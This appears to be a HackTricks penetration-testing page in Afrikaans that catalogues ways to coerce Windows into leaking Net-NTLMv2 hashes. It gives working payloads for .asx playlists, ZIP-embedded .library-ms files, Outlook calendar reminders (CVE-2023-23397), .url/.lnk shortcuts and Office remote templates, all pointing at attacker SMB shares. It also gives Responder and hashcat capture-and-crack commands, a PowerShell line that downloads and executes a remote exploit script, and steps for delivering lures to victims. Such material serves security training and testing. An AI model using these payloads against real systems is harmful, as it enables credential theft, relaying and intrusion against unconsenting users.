# Plekke om NTLM creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die goeie idees by [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — van die aflaai van 'n microsoft word lêer aanlyn tot die ntlm leak-bron: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

As jy 'n teiken daarheen kan kry om 'n Windows Media Player-afspeellys wat jy beheer te open of te voorsien, kan jy Net‑NTLMv2 leak deur die inskrywing na 'n UNC-pad te wys. WMP sal probeer om die verwysde media oor SMB te haal en sal implisiet autentiseer.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versameling en kraakproses:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ingeslote .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer hulle direk vanuit 'n ZIP-argief oopgemaak word. As die library-definisie na 'n afgeleë UNC-pad wys (bv. \\attacker\share), veroorsaak dit dat bloot die blaaien of opstart van die .library-ms binne die ZIP Explorer die UNC laat enumerate en NTLM-authenticatie na die attacker uitstuur. Dit lewer 'n NetNTLMv2 wat offline gekraak kan word of moontlik relayed.

Minimale .library-ms wat na 'n attacker UNC wys
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname).
- Pak dit in 'n ZIP (op Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Begin 'n NTLM capture listener en wag dat die slagoffer die .library-ms vanuit die ZIP oopmaak.


### Outlook kalenderherinnering se klankpad (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows het die uitgebreide MAPI-eienskap PidLidReminderFileParameter in kalenderitems verwerk. As daardie eienskap na 'n UNC-pad wys (bv. \\attacker\share\alert.wav), sou Outlook die SMB-share kontak wanneer die herinnering afgaan, wat die gebruiker se Net‑NTLMv2 leaking tot gevolg gehad het sonder enige klik. Dit is op 14 Maart 2023 gepatch, maar dit bly steeds uiters relevant vir legacy/ongewysigde fleets en vir historiese voorvalreaksie.

Vinnige eksploitasie met PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-kant:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Aantekeninge
- 'n slagoffer het slegs Outlook for Windows nodig wanneer die herinnering afgaan.
- Die leak lewer Net‑NTLMv2 geskik vir offline cracking of relay (nie pass‑the‑hash nie).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer gee kortpadikone outomaties weer. Onlangse navorsing het getoon dat selfs na Microsoft’s April 2025 patch vir UNC‑icon shortcuts dit steeds moontlik was om NTLM authentication sonder klikke te trigger deur die shortcut‑doel op 'n UNC path te huisves en die ikoon lokaal te hou (patch bypass assigned CVE‑2025‑50154). Slegs die besigtiging van die vouer veroorsaak dat Explorer metadata van die remote target aflaai en NTLM na die aanvaller se SMB server uitstuur.

Minimale Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program-kortpad payload (.lnk) deur PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Afleweringsidees
- Plaas die shortcut in 'n ZIP en kry die slagoffer om dit te deurblaai.
- Plaas die shortcut op 'n writable share wat die slagoffer sal oopmaak.
- Kombineer met ander lure files in dieselfde gids sodat Explorer die items voorskou.


### Office remote template injection (.docx/.dotm) om NTLM af te dwing

Office-dokumente kan na 'n eksterne template verwys. As jy die aangehegte template na 'n UNC path stel, sal die opening van die dokument teen SMB geauthentiseer word.

Minimale DOCX relationship-wysigings (inside word/):

1) Wysig word/settings.xml en voeg die aangehegte template-verwysing by:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Wysig word/_rels/settings.xml.rels en wys rId1337 na jou UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Herverpak na .docx en lewer af. Begin jou SMB capture listener en wag vir die open.

Vir post-capture-idees oor relaying of misbruik van NTLM, kyk:

{{#ref}}
README.md
{{#endref}}


## Verwysings
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
